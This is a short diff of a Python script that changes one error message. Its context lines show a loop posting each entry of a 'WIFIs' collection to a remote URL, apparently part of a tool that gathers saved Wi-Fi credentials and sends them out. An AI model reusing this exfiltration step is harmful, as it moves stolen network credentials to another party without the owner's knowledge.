@@ -78,7 +78,7 @@ def urlweb(url):
         for i in WIFIs:
             requests.post(urlpost, data=i)
     except:
-        print('Error: url not specified or invalid url | url no especificada o es invalida')
+        print('Error could not send: url not specified or invalid url | url no especificada o es invalida')
 
 if __name__ == '__main__':
     main()
